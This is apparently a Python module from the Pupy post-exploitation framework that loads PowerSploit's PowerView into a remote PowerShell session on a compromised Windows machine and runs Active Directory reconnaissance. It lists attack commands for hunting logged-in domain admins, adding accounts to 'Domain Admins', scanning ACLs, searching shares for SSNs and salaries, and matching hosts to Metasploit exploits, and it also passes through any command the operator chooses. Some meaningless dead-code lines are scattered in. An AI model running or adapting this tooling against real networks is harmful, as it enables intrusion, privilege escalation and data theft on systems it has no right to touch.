import os
from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from pupylib import ROOT
__class_name__ = 'Powerview'

@config(compat='windows', category='gather')
class Powerview(PupyModule):
    """
        execute powerview commands
    """
    dependencies = {'windows': ['powershell']}

    @classmethod
    def init_argparse(cls):
        if False:
            i = 10
            return i + 15
        cls.commands_available = '\nCommandes available:\n\nSet-MacAttribute -FilePath c:\\test\\newfile -OldFilePath c:\\test\\oldfile\nSet-MacAttribute -FilePath c:\\demo\\test.xt -All "01/03/2006 12:12 pm"\nSet-MacAttribute -FilePath c:\\demo\\test.txt -Modified "01/03/2006 12:12 pm" -Accessed "01/03/2006 12:11 pm" -Created "01/03/2006 12:10 pm"\nCopy-ClonedFile -SourceFile program.exe -DestFile \\\\WINDOWS7\\tools\\program.exe\nGet-IPAddress -ComputerName SERVER\nConvert-NameToSid \'DEV\\dfm\'\nConvert-SidToName S-1-5-21-2620891829-2411261497-1773853088-1105\nConvert-NT4toCanonical -ObjectName "dev\\dfm"\nConvertFrom-UACValue -Value 66176\nGet-NetUser jason | select useraccountcontrol | ConvertFrom-UACValue\nGet-NetUser jason | select useraccountcontrol | ConvertFrom-UACValue -ShowAll\nGet-Proxy\nGet-DomainSearcher -Domain testlab.local\nGet-DomainSearcher -Domain testlab.local -DomainController SECONDARY.dev.testlab.local\nGet-NetDomain -Domain testlab.local\nGet-NetForest -Forest external.domain\nGet-NetForestDomain\nGet-NetForestDomain -Forest external.local\nGet-NetForestCatalog\nGet-NetDomainController -Domain test\nGet-NetUser -Domain testing\nGet-NetUser -ADSpath "LDAP://OU=secret,DC=testlab,DC=local"\nAdd-NetUser -UserName john -Password \'Password123!\'\nAdd-NetUser -UserName john -Password \'Password123!\' -ComputerName server.testlab.local\nAdd-NetUser -UserName john -Password password -GroupName "Domain Admins" -Domain \'\'\nAdd-NetUser -UserName john -Password password -GroupName "Domain Admins" -Domain \'testing\'\nAdd-NetGroupUser -UserName john -GroupName Administrators\nAdd-NetGroupUser -UserName john -GroupName "Domain Admins" -Domain dev.local\nGet-UserProperty -Domain testing\nGet-UserProperty -Properties ssn,lastlogon,location\nFind-UserField -SearchField info -SearchTerm backup\nGet-UserEvent -ComputerName DomainController.testlab.local\nGet-ObjectAcl -SamAccountName matt.admin -domain testlab.local\nGet-ObjectAcl -SamAccountName matt.admin -domain testlab.local -ResolveGUIDs\nInvoke-ACLScanner -ResolveGUIDs | Export-CSV -NoTypeInformation acls.csv\nGet-NetComputer\nGet-NetComputer -SPN mssql*\nGet-NetComputer -Domain testing\nGet-NetComputer -Domain testing -FullData\nGet-ADObject -SID "S-1-5-21-2620891829-2411261497-1773853088-1110"\nGet-ADObject -ADSpath "CN=AdminSDHolder,CN=System,DC=testlab,DC=local"\nSet-ADObject -SamAccountName matt.admin -PropertyName countrycode -PropertyValue 0\nSet-ADObject -SamAccountName matt.admin -PropertyName useraccountcontrol -PropertyXorValue 65536\nGet-ComputerProperty -Domain testing\nGet-ComputerProperty -Properties ssn,lastlogon,location\nFind-ComputerField -SearchTerm backup -SearchField info\nGet-NetOU\nGet-NetOU -OUName *admin* -Domain testlab.local\nGet-NetOU -GUID 123-...\nGet-NetSite -Domain testlab.local -FullData\nGet-NetSubnet\nGet-NetSubnet -Domain testlab.local -FullData\nGet-NetGroup\nGet-NetGroup -GroupName *admin*\nGet-NetGroup -Domain testing -FullData\nGet-NetGroupMember\nGet-NetGroupMember -Domain testing -GroupName "Power Users"\nGet-NetFileServer\nGet-NetFileServer -Domain testing\nGet-DFSshare\nGet-DFSshare -Domain test\nGet-GptTmpl -GptTmplPath "\\\\dev.testlab.local\\sysvol\\dev.testlab.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf"\nGet-NetGPO -Domain testlab.local\nGet-NetGPOGroup\nFind-GPOLocation -UserName dfm\nFind-GPOLocation -UserName dfm -Domain dev.testlab.local\nFind-GPOLocation -UserName jason -LocalGroup RDP\nFind-GPOComputerAdmin -ComputerName WINDOWS3.dev.testlab.local\nFind-GPOComputerAdmin -ComputerName WINDOWS3.dev.testlab.local -LocalGroup RDP\nGet-NetGPO\nGet-NetLocalGroup\nGet-NetLocalGroup -ComputerName WINDOWSXP\nGet-NetLocalGroup -ComputerName WINDOWS7 -Resurse\nGet-NetLocalGroup -ComputerName WINDOWS7 -ListGroups\nGet-NetShare\nGet-NetShare -ComputerName sqlserver\nGet-NetLoggedon\nGet-NetLoggedon -ComputerName sqlserver\nGet-NetSession\nGet-NetSession -ComputerName sqlserver\nGet-NetRDPSession\nGet-NetRDPSession -ComputerName "sqlserver"\nInvoke-CheckLocalAdminAccess -ComputerName sqlserver\nGet-LastLoggedOn\nGet-LastLoggedOn -ComputerName WINDOWS1\nGet-CachedRDPConnection\nGet-CachedRDPConnection -ComputerName WINDOWS2.testlab.local\nGet-CachedRDPConnection -ComputerName WINDOWS2.testlab.local -RemoteUserName DOMAIN\\user -RemotePassword Password123!\nGet-NetProcess -ComputerName WINDOWS1\nFind-InterestingFile -Path C:\\Backup\\\nFind-InterestingFile -Path \\\\WINDOWS7\\Users\\ -Terms salaries,email -OutFile out.csv\nFind-InterestingFile -Path \\\\WINDOWS7\\Users\\ -LastAccessTime (Get-Date).AddDays(-7)\nInvoke-UserHunter -CheckAccess\nInvoke-UserHunter -Domain \'testing\'\nInvoke-UserHunter -Threads 20\nInvoke-UserHunter -UserFile users.txt -ComputerFile hosts.txt\nInvoke-UserHunter -GroupName "Power Users" -Delay 60\nInvoke-UserHunter -TargetServer FILESERVER\nInvoke-UserHunter -SearchForest\nInvoke-UserHunter -Stealth\nInvoke-ProcessHunter -Domain \'testing\'\nInvoke-ProcessHunter -Threads 20\nInvoke-ProcessHunter -UserFile users.txt -ComputerFile hosts.txt\nInvoke-ProcessHunter -GroupName "Power Users" -Delay 60\nInvoke-EventHunter\nInvoke-ShareFinder -ExcludeStandard\nInvoke-ShareFinder -Threads 20\nInvoke-ShareFinder -Delay 60\nInvoke-ShareFinder -ComputerFile hosts.txt\nInvoke-FileFinder\nInvoke-FileFinder -Domain testing\nInvoke-FileFinder -IncludeC\nInvoke-FileFinder -ShareList shares.txt -Terms accounts,ssn -OutFile out.csv\nFind-LocalAdminAccess\nFind-LocalAdminAccess -Threads 10\nFind-LocalAdminAccess -Domain testing\nFind-LocalAdminAccess -ComputerFile hosts.txt\nGet-ExploitableSystem -DomainController 192.168.1.1 -Credential demo.com\\user | Format-Table -AutoSize\nGet-ExploitableSystem | Export-Csv c:\\temp\\output.csv -NoTypeInformation\nGet-ExploitableSystem -Domain testlab.local -Ping\nInvoke-EnumerateLocalAdmin\nInvoke-EnumerateLocalAdmin -Threads 10\nGet-NetDomainTrust\nGet-NetDomainTrust -Domain "prod.testlab.local"\nGet-NetDomainTrust -Domain "prod.testlab.local" -DomainController "PRIMARY.testlab.local"\nGet-NetForestTrust\nGet-NetForestTrust -Forest "test"\nInvoke-MapDomainTrust | Export-CSV -NoTypeInformation trusts.csv\n'
        cls.arg_parser = PupyArgumentParser(prog='Powerview', description=cls.__doc__)
        cls.arg_parser.add_argument('-o', metavar='COMMAND', dest='command')
        cls.arg_parser.add_argument('-1', '--once', action='store_true', help='Unload after execution')
        cls.arg_parser.add_argument('-l', '--list-available-commands', action='store_true', help='list all available commands')
        cls.arg_parser.add_argument('--Get-Proxy', dest='GetProxy', action='store_true', help='Returns proxy configuration')
        cls.arg_parser.add_argument('--Get-NetComputer', dest='GetNetComputer', action='store_true', help='Returns the current computers in current domain')
        cls.arg_parser.add_argument('--Get-NetMssql', dest='GetNetMssql', action='store_true', help='Returns all MS SQL servers on the domain')
        cls.arg_parser.add_argument('--Get-NetSubnet', dest='GetNetSubnet', action='store_true', help='Returns all subnet names in the current domain')
        cls.arg_parser.add_argument('--Get-NetGroup', dest='GetNetGroup', action='store_true', help='Returns the current groups in the domain')
        cls.arg_parser.add_argument('--Get-NetGroup-with', dest='GetNetGroupWith', help="Returns all groups with '*GROUPNAME*' in their group name")
        cls.arg_parser.add_argument('--Get-NetGroupMember', dest='GetNetGroupMember', action='store_true', help="Returns the usernames that of members of the 'Domain Admins' domain group")
        cls.arg_parser.add_argument('--Get-NetFileServer', dest='GetNetFileServer', action='store_true', help='Returns active file servers')
        cls.arg_parser.add_argument('--Get-DFSshare', dest='GetDFSshare', action='store_true', help='Returns all distributed file system shares for the current domain')
        cls.arg_parser.add_argument('--Get-NetGPO', dest='GetNetGPO', action='store_true', help='Returns the GPOs in domain')
        cls.arg_parser.add_argument('--Get-NetGPOGroup', dest='GetNetGPOGroup', action='store_true', help='Returns all GPOs that set local groups on the current domain')
        cls.arg_parser.add_argument('--Find-GPOLocation', dest='FindGPOLocation', help='Find all computers that this user has local administrator rights to in the current domain')
        cls.arg_parser.add_argument('--Get-NetLocalGroup', dest='GetNetLocalGroup', action='store_true', help="Returns the usernames that of members of localgroup 'Administrators' on the local host")
        cls.arg_parser.add_argument('--Get-NetLoggedon', dest='GetNetLoggedon', action='store_true', help='Returns users actively logged onto the local host')
        cls.arg_parser.add_argument('--Get-NetLoggedon-on', dest='GetNetLoggedonOn', help='Returns users actively logged onto this remote host')
        cls.arg_parser.add_argument('--Get-NetSession', dest='GetNetSession', action='store_true', help='Returns active sessions on the local host')
        cls.arg_parser.add_argument('--Get-NetSession-on', dest='GetNetSessionOn', help='Returns active sessions on this remote host')
        cls.arg_parser.add_argument('--Get-NetRDPSession', dest='GetNetRDPSession', action='store_true', help='Returns active RDP/terminal sessions on the local host')
        cls.arg_parser.add_argument('--Get-NetRDPSession-on', dest='GetNetRDPSessionOn', help='Returns active RDP/terminal sessions on this remote host')
        cls.arg_parser.add_argument('--Get-LastLoggedOn', dest='GetLastLoggedOn', action='store_true', help='Returns the last user logged onto the local machine')
        cls.arg_parser.add_argument('--Get-LastLoggedOn-on', dest='GetLastLoggedOnOn', help='Returns the last user logged onto this remote machine')
        cls.arg_parser.add_argument('--Invoke-UserHunter-check', dest='InvokeUserHunterCheck', action='store_true', help='Finds machines on the local domain where domain admins are logged into and checks if the current user has local administrator access')
        cls.arg_parser.add_argument('--Invoke-UserHunter-forest', dest='InvokeUserHunterForest', action='store_true', help='Find all machines in the current forest where domain admins are logged in')
        cls.arg_parser.add_argument('--Get-ExploitableSystem', dest='GetExploitableSystem', action='store_true', help='Query Active Directory for the hostname, OS version, and service pack level for each computer account (cross-referenced against a list of common Metasploit exploits)')

    def run(self, args):
        if False:
            return 10
        script = 'powerview'
        command = ''
        if args.list_available_commands:
            self.log(self.commands_available)
            return
        powershell = self.client.conn.modules['powershell']
        if not powershell.loaded(script):
            with open(os.path.join(ROOT, 'external', 'PowerSploit', 'Recon', 'PowerView.ps1'), 'r') as content:
                (width, _) = self.iogroup.consize
                powershell.load(script, content.read(), width=width)
        if args.GetProxy:
            command = 'Get-Proxy'
        if args.GetNetComputer:
            command = 'Get-NetComputer'
        elif args.GetNetMssql:
            command = 'Get-NetComputer -SPN mssql*'
        elif args.GetNetSubnet:
            command = 'Get-NetSubnet'
        elif args.GetNetGroup:
            command = 'Get-NetGroup'
        elif args.GetNetGroupWith is not None:
            command = 'Get-NetGroup -GroupName *{0}* -FullData'.format(args.GetNetGroupWith)
        elif args.GetNetGroupMember:
            command = 'Get-NetGroupMember'
        elif args.GetNetFileServer:
            command = 'Get-NetFileServer'
        elif args.GetDFSshare:
            command = 'Get-DFSshare'
        elif args.GetNetGPO:
            command = 'Get-NetGPO'
        elif args.GetNetGPOGroup:
            command = 'Get-NetGPOGroup'
        elif args.FindGPOLocation is not None:
            command = 'Find-GPOLocation -UserName {0}'.format(args.FindGPOLocation)
        elif args.GetNetLocalGroup:
            command = 'Get-NetLocalGroup'
        elif args.GetNetLoggedon:
            command = 'Get-NetLoggedon'
        elif args.GetNetLoggedonOn is not None:
            command = 'Get-NetLoggedon -ComputerName {0}'.format(args.GetNetLoggedonOn)
        elif args.GetNetSession:
            command = 'Get-NetSession'
        elif args.GetNetSessionOn is not None:
            command = 'Get-NetSession -ComputerName {0}'.format(args.GetNetSessionOn)
        elif args.GetNetRDPSession:
            command = 'Get-NetRDPSession'
        elif args.GetNetRDPSessionOn is not None:
            command = 'Get-NetRDPSession -ComputerName {0}'.format(args.GetNetRDPSessionOn)
        elif args.GetLastLoggedOn:
            command = 'Get-LastLoggedOn'
        elif args.GetLastLoggedOnOn is not None:
            command = 'Get-LastLoggedOn -ComputerName {0}'.format(args.GetLastLoggedOnOn)
        elif args.InvokeUserHunterCheck:
            command = 'Invoke-UserHunter -CheckAccess'
        elif args.InvokeUserHunterForest:
            command = 'Invoke-UserHunter -SearchForest'
        elif args.GetExploitableSystem:
            command = 'Get-ExploitableSystem  | Format-Table -AutoSize'
        if command == '':
            if args.command is None:
                self.error('You have to choose a powerview command!')
                return
            else:
                command = args.command
        self.log('Executing the following powerview command: {}'.format(command))
        (output, rest) = powershell.call(script, command)
        if args.once:
            powershell.unload(script)
        if not output and (not rest):
            self.error('No results')
            return
        else:
            if rest:
                self.error(rest)
            if output:
                self.log(output)